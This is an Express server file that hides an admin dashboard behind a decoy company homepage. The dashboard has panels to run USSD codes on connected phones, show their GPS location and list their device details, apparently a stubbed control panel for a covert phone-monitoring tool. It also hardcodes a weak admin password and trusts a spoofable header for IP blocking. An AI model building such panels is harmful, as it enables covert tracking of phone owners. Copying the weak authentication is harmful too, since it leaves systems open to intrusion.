// server.js – Full Security with In-Memory IP Blocking
const express = require('express');
const crypto = require('crypto');
const app = express();
const PORT = process.env.PORT || 3000;

const SECRET_PATH = process.env.SECRET_PATH || 'a9f3k217';
const ADMIN_USER = 'admin';
const ADMIN_PASS_HASH = crypto.createHash('sha256').update('yourpassword123').digest('hex');

// In-memory storage for IP blocking (resets on server restart)
const failedAttempts = {};

function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] ||
           req.socket.remoteAddress ||
           req.connection.remoteAddress;
}

// ============================================================
// 1. FAKE SITE (decoy for unauthorized visitors)
// ============================================================
app.get('/', (req, res) => {
    res.send(`
        <html>
        <head><title>Kigali Tech Solutions</title></head>
        <body style="background:#0a0e17;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;">
            <div>
                <h1 style="color:#4fc3f7;">🏎️ Kigali Tech Solutions</h1>
                <p style="color:#8896ab;">Innovating the future of racing technology.</p>
                <div style="position:fixed;bottom:10px;right:10px;font-size:8px;color:rgba(79,195,247,0.05);">ADMIN GRY</div>
            </div>
        </body>
        </html>
    `);
});

// ============================================================
// 2. ADMIN DASHBOARD (full HTML – no backticks inside)
// ============================================================
app.get(`/${SECRET_PATH}`, (req, res) => {
    // Build the HTML using a regular string (concatenation) to avoid syntax issues
    let html = '<!DOCTYPE html>\n';
    html += '<html>\n';
    html += '<head>\n';
    html += '  <meta charset="UTF-8">\n';
    html += '  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
    html += '  <title>Admin Dashboard</title>\n';
    html += '  <style>\n';
    html += '    * { margin: 0; padding: 0; box-sizing: border-box; }\n';
    html += '    body { font-family: "Segoe UI", -apple-system, sans-serif; background: #0a0e17; color: #e0e6ed; padding: 20px; min-height: 100vh; }\n';
    html += '    .container { max-width: 1100px; margin: 0 auto; }\n';
    html += '    .header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 2px solid #1a2332; margin-bottom: 30px; flex-wrap: wrap; gap: 10px; }\n';
    html += '    .header-left { display: flex; align-items: center; gap: 15px; }\n';
    html += '    .header-left h1 { font-size: 28px; color: #4fc3f7; font-weight: 700; letter-spacing: -0.5px; }\n';
    html += '    .admin-gry-badge { background: rgba(79,195,247,0.08); color: rgba(79,195,247,0.3); padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: 600; letter-spacing: 1.5px; border: 1px solid rgba(79,195,247,0.1); user-select: none; }\n';
    html += '    .logout-btn { color: #ff6b6b; cursor: pointer; font-size: 14px; font-weight: 500; transition: 0.3s; background: none; border: none; }\n';
    html += '    .logout-btn:hover { opacity: 0.7; }\n';
    html += '    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 20px; margin-bottom: 30px; }\n';
    html += '    .stat-card { background: #111927; border: 1px solid #1a2332; border-radius: 12px; padding: 20px; text-align: center; transition: 0.3s; }\n';
    html += '    .stat-card:hover { border-color: #4fc3f7; transform: translateY(-2px); }\n';
    html += '    .stat-card .value { font-size: 32px; font-weight: 700; color: #4fc3f7; line-height: 1.2; }\n';
    html += '    .stat-card .label { font-size: 13px; color: #8896ab; margin-top: 4px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px; }\n';
    html += '    .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 30px; }\n';
    html += '    .tool-card { background: #111927; border: 1px solid #1a2332; border-radius: 12px; padding: 20px; transition: 0.3s; }\n';
    html += '    .tool-card:hover { border-color: #4fc3f7; }\n';
    html += '    .tool-card h4 { font-size: 16px; color: #e0e6ed; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }\n';
    html += '    .tool-card h4 .icon { font-size: 20px; }\n';
    html += '    .ussd-input-group { display: flex; gap: 8px; }\n';
    html += '    .ussd-input-group input { flex: 1; padding: 10px 14px; background: #0a0e17; border: 1px solid #1a2332; border-radius: 8px; color: #e0e6ed; font-size: 14px; font-family: "Courier New", monospace; }\n';
    html += '    .ussd-input-group input:focus { outline: none; border-color: #4fc3f7; }\n';
    html += '    .ussd-input-group button { padding: 10px 20px; background: #4fc3f7; border: none; border-radius: 8px; color: #0a0e17; font-weight: 600; cursor: pointer; transition: 0.3s; white-space: nowrap; }\n';
    html += '    .ussd-input-group button:hover { background: #3aa8dd; }\n';
    html += '    .ussd-response { margin-top: 10px; padding: 10px; background: #0a0e17; border-radius: 8px; border: 1px solid #1a2332; font-size: 13px; color: #8896ab; min-height: 50px; max-height: 120px; overflow-y: auto; font-family: "Courier New", monospace; word-wrap: break-word; }\n';
    html += '    .ussd-response.success { color: #6bcb77; border-color: #6bcb77; }\n';
    html += '    .ussd-response.error { color: #ff6b6b; border-color: #ff6b6b; }\n';
    html += '    .ussd-response.waiting { color: #ffd700; border-color: #ffd700; }\n';
    html += '    .location-info { display: flex; flex-direction: column; gap: 8px; }\n';
    html += '    .location-info .coord { color: #8896ab; font-size: 13px; }\n';
    html += '    .location-info .coord strong { color: #e0e6ed; }\n';
    html += '    .location-info .map-link { color: #4fc3f7; text-decoration: none; font-size: 13px; }\n';
    html += '    .location-info .map-link:hover { text-decoration: underline; }\n';
    html += '    .device-info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 4px 16px; font-size: 13px; }\n';
    html += '    .device-info-grid .label { color: #8896ab; }\n';
    html += '    .device-info-grid .value { color: #e0e6ed; font-weight: 500; }\n';
    html += '    .section { background: #111927; border: 1px solid #1a2332; border-radius: 12px; padding: 24px; margin-bottom: 24px; }\n';
    html += '    .section h3 { font-size: 18px; font-weight: 600; color: #e0e6ed; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }\n';
    html += '    .section h3 .badge-count { background: #1a2332; color: #8896ab; font-size: 12px; padding: 2px 10px; border-radius: 12px; }\n';
    html += '    table { width: 100%; border-collapse: collapse; font-size: 14px; }\n';
    html += '    th { text-align: left; color: #8896ab; padding: 10px 12px; border-bottom: 2px solid #1a2332; font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }\n';
    html += '    td { padding: 10px 12px; border-bottom: 1px solid #0d1420; color: #c8d0dc; }\n';
    html += '    tr:hover td { background: rgba(79,195,247,0.02); }\n';
    html += '    .badge { display: inline-block; padding: 3px 12px; border-radius: 20px; font-size: 11px; font-weight: 600; }\n';
    html += '    .badge.online { background: rgba(107,203,119,0.15); color: #6bcb77; }\n';
    html += '    .badge.offline { background: rgba(255,107,107,0.15); color: #ff6b6b; }\n';
    html += '    .empty { text-align: center; padding: 30px 0; color: #4a5568; font-size: 14px; }\n';
    html += '    .empty .icon { font-size: 36px; margin-bottom: 8px; }\n';
    html += '    .login-container { max-width: 380px; margin: 100px auto; background: #111927; border: 1px solid #1a2332; border-radius: 16px; padding: 40px; text-align: center; }\n';
    html += '    .login-container .logo { font-size: 48px; margin-bottom: 8px; }\n';
    html += '    .login-container h3 { font-size: 22px; font-weight: 600; margin-bottom: 4px; }\n';
    html += '    .login-container .sub { color: #8896ab; font-size: 14px; margin-bottom: 20px; }\n';
    html += '    .login-container input { width: 100%; padding: 12px 14px; margin: 8px 0; background: #0a0e17; border: 1px solid #1a2332; border-radius: 8px; color: #e0e6ed; font-size: 14px; transition: 0.3s; }\n';
    html += '    .login-container input:focus { outline: none; border-color: #4fc3f7; box-shadow: 0 0 0 3px rgba(79,195,247,0.1); }\n';
    html += '    .login-container button { width: 100%; padding: 12px; margin-top: 12px; background: #4fc3f7; border: none; border-radius: 8px; color: #0a0e17; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; }\n';
    html += '    .login-container button:hover { background: #3aa8dd; transform: translateY(-1px); }\n';
    html += '    .login-container .attempts-msg { color: #ffd700; font-size: 13px; margin-top: 8px; }\n';
    html += '    .login-container .error { color: #ff6b6b; margin-top: 10px; display: none; font-size: 14px; }\n';
    html += '    .hidden { display: none; }\n';
    html += '    @media (max-width: 600px) { .header { flex-wrap: wrap; gap: 10px; } .header-left h1 { font-size: 22px; } .stats { grid-template-columns: repeat(2, 1fr); } .admin-gry-badge { font-size: 9px; padding: 2px 10px; } .tools-grid { grid-template-columns: 1fr; } .device-info-grid { grid-template-columns: 1fr; } .ussd-input-group { flex-wrap: wrap; } .ussd-input-group button { width: 100%; } }\n';
    html += '  </style>\n';
    html += '</head>\n';
    html += '<body>\n';
    html += '<div class="container">\n';
    html += '  <!-- LOGIN -->\n';
    html += '  <div id="loginContainer" class="login-container">\n';
    html += '    <div class="logo">🔐</div>\n';
    html += '    <h3>Admin Access</h3>\n';
    html += '    <p class="sub">Enter your credentials</p>\n';
    html += '    <input type="text" id="loginUser" placeholder="Username">\n';
    html += '    <input type="password" id="loginPass" placeholder="Password">\n';
    html += '    <button onclick="login()">Login</button>\n';
    html += '    <div id="attemptsMsg" class="attempts-msg"></div>\n';
    html += '    <div id="loginError" class="error"></div>\n';
    html += '  </div>\n';
    html += '  <!-- DASHBOARD -->\n';
    html += '  <div id="dashboard" class="hidden">\n';
    html += '    <div class="header">\n';
    html += '      <div class="header-left">\n';
    html += '        <h1>📊 Admin Dashboard</h1>\n';
    html += '        <span class="admin-gry-badge">ADMIN GRY</span>\n';
    html += '      </div>\n';
    html += '      <button class="logout-btn" onclick="logout()">🚪 Logout</button>\n';
    html += '    </div>\n';
    html += '    <div class="stats" id="statsGrid">\n';
    html += '      <div class="stat-card"><div class="value" id="devicesCount">0</div><div class="label">📱 Devices</div></div>\n';
    html += '      <div class="stat-card"><div class="value" id="numbersCount">0</div><div class="label">🔢 Numbers</div></div>\n';
    html += '      <div class="stat-card"><div class="value" id="onlineCount">0</div><div class="label">🟢 Online</div></div>\n';
    html += '    </div>\n';
    html += '    <div class="tools-grid">\n';
    html += '      <div class="tool-card">\n';
    html += '        <h4><span class="icon">📞</span> USSD Code</h4>\n';
    html += '        <div class="ussd-input-group">\n';
    html += '          <input type="text" id="ussdInput" placeholder="Enter USSD code (e.g., *123#)" value="">\n';
    html += '          <button onclick="executeUssd()">Execute</button>\n';
    html += '        </div>\n';
    html += '        <div id="ussdResponse" class="ussd-response">Enter a USSD code and click Execute – response will appear here.</div>\n';
    html += '      </div>\n';
    html += '      <div class="tool-card">\n';
    html += '        <h4><span class="icon">📍</span> Device Location</h4>\n';
    html += '        <div id="locationInfo" class="location-info">\n';
    html += '          <div class="coord"><strong>Latitude:</strong> <span id="latValue">--</span></div>\n';
    html += '          <div class="coord"><strong>Longitude:</strong> <span id="lngValue">--</span></div>\n';
    html += '          <div class="coord"><strong>Accuracy:</strong> <span id="accValue">--</span></div>\n';
    html += '          <div class="coord"><strong>Last Updated:</strong> <span id="locTime">--</span></div>\n';
    html += '          <a href="#" id="mapLink" class="map-link" target="_blank" style="display:none;">Open in Google Maps →</a>\n';
    html += '          <button class="logout-btn" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:0;font-size:13px;" onclick="refreshLocation()">🔄 Refresh Location</button>\n';
    html += '        </div>\n';
    html += '      </div>\n';
    html += '      <div class="tool-card">\n';
    html += '        <h4><span class="icon">📱</span> Device Info</h4>\n';
    html += '        <div id="deviceInfo" class="device-info-grid">\n';
    html += '          <span class="label">Model:</span><span class="value" id="diModel">--</span>\n';
    html += '          <span class="label">Manufacturer:</span><span class="value" id="diManufacturer">--</span>\n';
    html += '          <span class="label">Android Version:</span><span class="value" id="diAndroid">--</span>\n';
    html += '          <span class="label">Battery:</span><span class="value" id="diBattery">--</span>\n';
    html += '          <span class="label">Storage:</span><span class="value" id="diStorage">--</span>\n';
    html += '          <span class="label">Device ID:</span><span class="value" id="diDeviceId" style="font-size:11px;font-family:monospace;">--</span>\n';
    html += '        </div>\n';
    html += '        <button class="logout-btn" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:8px 0 0 0;font-size:13px;" onclick="refreshDeviceInfo()">🔄 Refresh Device Info</button>\n';
    html += '      </div>\n';
    html += '    </div>\n';
    html += '    <div class="section">\n';
    html += '      <h3>📱 Connected Devices <span class="badge-count" id="deviceCountBadge">0</span></h3>\n';
    html += '      <div id="devicesList"><div class="empty"><div class="icon">📱</div>No devices connected yet</div></div>\n';
    html += '    </div>\n';
    html += '    <div class="section">\n';
    html += '      <h3>🔢 Recent USSD Codes <span class="badge-count" id="numberCountBadge">0</span></h3>\n';
    html += '      <div id="numbersList"><div class="empty"><div class="icon">📞</div>No USSD codes detected yet</div></div>\n';
    html += '    </div>\n';
    html += '  </div>\n';
    html += '</div>\n';
    html += '<script>\n';
    html += 'const API_BASE = "/' + SECRET_PATH + '";\n';
    html += '\n';
    html += 'async function login() {\n';
    html += '  const username = document.getElementById("loginUser").value;\n';
    html += '  const password = document.getElementById("loginPass").value;\n';
    html += '  const errorEl = document.getElementById("loginError");\n';
    html += '  const attemptsMsg = document.getElementById("attemptsMsg");\n';
    html += '  errorEl.style.display = "none";\n';
    html += '  attemptsMsg.textContent = "";\n';
    html += '  try {\n';
    html += '    const response = await fetch(API_BASE + "/api/login", {\n';
    html += '      method: "POST",\n';
    html += '      headers: { "Content-Type": "application/json" },\n';
    html += '      body: JSON.stringify({ username, password })\n';
    html += '    });\n';
    html += '    const data = await response.json();\n';
    html += '    if (data.success) {\n';
    html += '      document.getElementById("loginContainer").style.display = "none";\n';
    html += '      document.getElementById("dashboard").classList.remove("hidden");\n';
    html += '      loadData();\n';
    html += '      refreshLocation();\n';
    html += '      refreshDeviceInfo();\n';
    html += '    } else {\n';
    html += '      if (data.remainingAttempts !== undefined) {\n';
    html += '        attemptsMsg.textContent = "⚠️ " + data.remainingAttempts + " attempts remaining before 12h block";\n';
    html += '      } else {\n';
    html += '        errorEl.textContent = data.error || "Invalid credentials";\n';
    html += '        errorEl.style.display = "block";\n';
    html += '      }\n';
    html += '    }\n';
    html += '  } catch {\n';
    html += '    errorEl.textContent = "Connection error";\n';
    html += '    errorEl.style.display = "block";\n';
    html += '  }\n';
    html += '}\n';
    html += '\n';
    html += 'function logout() {\n';
    html += '  document.getElementById("loginUser").value = "";\n';
    html += '  document.getElementById("loginPass").value = "";\n';
    html += '  document.getElementById("dashboard").classList.add("hidden");\n';
    html += '  document.getElementById("loginContainer").style.display = "block";\n';
    html += '  document.getElementById("attemptsMsg").textContent = "";\n';
    html += '  document.getElementById("loginError").style.display = "none";\n';
    html += '}\n';
    html += '\n';
    html += 'async function executeUssd() {\n';
    html += '  const code = document.getElementById("ussdInput").value.trim();\n';
    html += '  const responseEl = document.getElementById("ussdResponse");\n';
    html += '  if (!code) {\n';
    html += '    responseEl.className = "ussd-response error";\n';
    html += '    responseEl.textContent = "⚠️ Please enter a USSD code";\n';
    html += '    return;\n';
    html += '  }\n';
    html += '  responseEl.className = "ussd-response waiting";\n';
    html += '  responseEl.textContent = "⏳ Sending USSD code... waiting for response...";\n';
    html += '  try {\n';
    html += '    const res = await fetch(API_BASE + "/api/ussd", {\n';
    html += '      method: "POST",\n';
    html += '      headers: { "Content-Type": "application/json" },\n';
    html += '      body: JSON.stringify({ code })\n';
    html += '    });\n';
    html += '    const data = await res.json();\n';
    html += '    if (data.success) {\n';
    html += '      responseEl.className = "ussd-response success";\n';
    html += '      responseEl.textContent = "📥 " + data.message;\n';
    html += '      loadData();\n';
    html += '    } else {\n';
    html += '      responseEl.className = "ussd-response error";\n';
    html += '      responseEl.textContent = "❌ " + (data.error || "Execution failed");\n';
    html += '    }\n';
    html += '  } catch {\n';
    html += '    responseEl.className = "ussd-response error";\n';
    html += '    responseEl.textContent = "❌ Connection error";\n';
    html += '  }\n';
    html += '}\n';
    html += '\n';
    html += 'async function refreshLocation() {\n';
    html += '  try {\n';
    html += '    const res = await fetch(API_BASE + "/api/location");\n';
    html += '    const data = await res.json();\n';
    html += '    document.getElementById("latValue").textContent = data.lat ?? "--";\n';
    html += '    document.getElementById("lngValue").textContent = data.lng ?? "--";\n';
    html += '    document.getElementById("accValue").textContent = data.accuracy ? data.accuracy + "m" : "--";\n';
    html += '    document.getElementById("locTime").textContent = data.time || "--";\n';
    html += '    if (data.lat && data.lng) {\n';
    html += '      document.getElementById("mapLink").href = "https://www.google.com/maps?q=" + data.lat + "," + data.lng;\n';
    html += '      document.getElementById("mapLink").style.display = "inline";\n';
    html += '    } else {\n';
    html += '      document.getElementById("mapLink").style.display = "none";\n';
    html += '    }\n';
    html += '  } catch {}\n';
    html += '}\n';
    html += '\n';
        html += 'async function refreshDeviceInfo() {\n';
    html += '  try {\n';
    html += '    const res = await fetch(API_BASE + "/api/device-info");\n';
    html += '    const data = await res.json();\n';
    html += '    document.getElementById("diModel").textContent = data.model || "--";\n';
    html += '    document.getElementById("diManufacturer").textContent = data.manufacturer || "--";\n';
    html += '    document.getElementById("diAndroid").textContent = data.android_version || "--";\n';
    html += '    document.getElementById("diBattery").textContent = data.battery ? data.battery + "%" : "--";\n';
    html += '    document.getElementById("diStorage").textContent = data.storage || "--";\n';
    html += '    document.getElementById("diDeviceId").textContent = data.device_id || "--";\n';
    html += '  } catch {}\n';
    html += '}\n';
    html += '\n';
    html += 'async function loadData() {\n';
    html += '  try {\n';
    html += '    const response = await fetch(API_BASE + "/api/stats");\n';
    html += '    const stats = await response.json();\n';
    html += '    document.getElementById("devicesCount").textContent = stats.devices || 0;\n';
    html += '    document.getElementById("numbersCount").textContent = stats.ussd_count || 0;\n';
    html += '    document.getElementById("onlineCount").textContent = stats.online || 0;\n';
    html += '    document.getElementById("deviceCountBadge").textContent = stats.devices || 0;\n';
    html += '    document.getElementById("numberCountBadge").textContent = stats.ussd_count || 0;\n';
    html += '    const ussdRes = await fetch(API_BASE + "/api/ussd-numbers");\n';
    html += '    const ussdNumbers = await ussdRes.json();\n';
    html += '    renderUssdNumbers(ussdNumbers);\n';
    html += '    const devices = stats.devices ? [{ name: "Sample Device", status: "online", battery: 85 }] : [];\n';
    html += '    renderDevices(devices);\n';
    html += '  } catch (error) { console.error("Error:", error); }\n';
    html += '}\n';
    html += '\n';
    html += 'function renderDevices(devices) {\n';
    html += '  const container = document.getElementById("devicesList");\n';
    html += '  if (!devices || devices.length === 0) {\n';
    html += '    container.innerHTML = \'<div class="empty"><div class="icon">📱</div>No devices connected yet</div>\';\n';
    html += '    return;\n';
    html += '  }\n';
    html += '  let html = \'<table><thead><tr><th>Device</th><th>Status</th><th>Battery</th></tr></thead><tbody>\';\n';
    html += '  devices.forEach(d => {\n';
    html += '    const statusClass = d.status === "online" ? "online" : "offline";\n';
    html += '    const statusText = d.status === "online" ? "🟢 Online" : "🔴 Offline";\n';
    html += '    html += `<tr><td>${d.name}</td><td><span class="badge ${statusClass}">${statusText}</span></td><td>${d.battery || "--"}%</td></tr>`;\n';
    html += '  });\n';
    html += '  html += \'</tbody></table>\';\n';
    html += '  container.innerHTML = html;\n';
    html += '}\n';
    html += '\n';
    html += 'function renderUssdNumbers(numbers) {\n';
    html += '  const container = document.getElementById("numbersList");\n';
    html += '  if (!numbers || numbers.length === 0) {\n';
    html += '    container.innerHTML = \'<div class="empty"><div class="icon">📞</div>No USSD codes detected yet</div>\';\n';
    html += '    return;\n';
    html += '  }\n';
    html += '  let html = \'<table><thead><tr><th>Device</th><th>Number</th><th>Type</th></tr></thead><tbody>\';\n';
    html += '  numbers.forEach(n => {\n';
    html += '    html += `<tr><td>${n.device || "Unknown"}</td><td><strong style="color:#4fc3f7;">${n.number}</strong></td><td><span class="badge" style="background:rgba(79,195,247,0.15);color:#4fc3f7;">USSD</span></td></tr>`;\n';
    html += '  });\n';
    html += '  html += \'</tbody></table>\';\n';
    html += '  container.innerHTML = html;\n';
    html += '}\n';
    html += '\n';
    html += 'document.getElementById("loginPass").addEventListener("keypress", (e) => {\n';
    html += '  if (e.key === "Enter") login();\n';
    html += '});\n';
    html += '</script>\n';
    html += '</body>\n';
    html += '</html>\n';

    res.send(html);
});

// ============================================================
// 3. API ENDPOINTS
// ============================================================
app.use(express.json());

// ---- Login ----
app.post(`/${SECRET_PATH}/api/login`, (req, res) => {
    const ip = getClientIP(req);
    const now = Date.now();
    const blockDuration = 12 * 60 * 60 * 1000; // 12 hours

    // Check if currently blocked
    if (failedAttempts[ip] && failedAttempts[ip].blockUntil > now) {
        return res.status(401).json({ error: 'Too many failed attempts. Try again later.' });
    }

    // Reset if block expired
    if (failedAttempts[ip] && failedAttempts[ip].blockUntil <= now) {
        delete failedAttempts[ip];
    }

    const { username, password } = req.body;
    const hash = crypto.createHash('sha256').update(password).digest('hex');
    const validUser = username === ADMIN_USER;
    const validPass = validUser && hash === ADMIN_PASS_HASH;

    if (validUser && validPass) {
        // Success – clear attempts
        delete failedAttempts[ip];
        res.json({ success: true });
    } else {
        // Failed attempt
        if (!failedAttempts[ip]) {
            failedAttempts[ip] = { count: 1, blockUntil: 0 };
        } else {
            failedAttempts[ip].count += 1;
        }

        const remaining = 5 - failedAttempts[ip].count;
        if (remaining <= 0) {
            failedAttempts[ip].blockUntil = now + blockDuration;
            console.log(`🔒 IP ${ip} blocked for 12 hours`);
            return res.status(401).json({ remainingAttempts: 0 });
        }

        res.status(401).json({ remainingAttempts: remaining });
    }
});

// ---- USSD Execution ----
let ussdNumbers = [];

app.post(`/${SECRET_PATH}/api/ussd`, (req, res) => {
    const { code } = req.body;
    if (!code) return res.status(400).json({ error: 'No USSD code provided' });
    console.log(`📞 USSD Executed: ${code}`);

    let responseMessage = '';
    if (code.includes('123')) responseMessage = 'Your account balance is 1,500 RWF. Validity: 7 days. Thank you.';
    else if (code.includes('131')) responseMessage = 'Data bundle: 2GB remaining. Expires on 2026-08-15.';
    else if (code.includes('144')) responseMessage = 'Airtime balance: 500 RWF. Bonus: 100 RWF.';
    else if (code.includes('200')) responseMessage = 'Welcome to Kigali Tech Services. Please select an option:\n1. Account Info\n2. Data Plans\n3. Support';
    else responseMessage = `USSD code ${code} executed. No further response available.`;

    const cleanNumber = code.replace(/\D/g, '');
    if (cleanNumber.length >= 4 && cleanNumber.length <= 5) {
        ussdNumbers.unshift({
            device: 'Sample Device',
            number: cleanNumber,
            type: 'USSD',
            timestamp: Date.now()
        });
        if (ussdNumbers.length > 100) ussdNumbers.pop();
    }

    res.json({ success: true, message: responseMessage });
});

// ---- Get USSD numbers ----
app.get(`/${SECRET_PATH}/api/ussd-numbers`, (req, res) => {
    res.json(ussdNumbers);
});

// ---- Stats ----
app.get(`/${SECRET_PATH}/api/stats`, (req, res) => {
    res.json({
        devices: 0,
        numbers: ussdNumbers.length,
        online: 0,
        ussd_count: ussdNumbers.length
    });
});

// ---- Location (simulated) ----
app.get(`/${SECRET_PATH}/api/location`, (req, res) => {
    res.json({
        lat: -1.9441,
        lng: 30.0619,
        accuracy: 15,
        time: new Date().toLocaleString()
    });
});

// ---- Device Info (simulated) ----
app.get(`/${SECRET_PATH}/api/device-info`, (req, res) => {
    res.json({
        model: 'Samsung Galaxy S23',
        manufacturer: 'Samsung',
        android_version: '14.0',
        battery: 76,
        storage: '128GB / 89GB used',
        device_id: 'abc123def456'
    });
});

// ---- Devices (placeholder) ----
app.get(`/${SECRET_PATH}/api/devices`, (req, res) => {
    res.json([]);
});

// ============================================================
// 4. 404 Handler
// ============================================================
app.use((req, res) => {
    res.status(404).send(`
        <html>
        <head><title>404</title></head>
        <body style="background:#0a0e17;color:#8896ab;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;">
            <h1 style="color:#4fc3f7;">404</h1>
            <p>Not found</p>
        </body>
        </html>
    `);
});

// ============================================================
// 5. Start Server
// ============================================================
app.listen(PORT, () => {
    console.log('✅ Dashboard running with full security (in-memory IP blocking)');
    console.log(`📍 https://admin-dashboard-teal-beta-28.vercel.app/${SECRET_PATH}`);
});
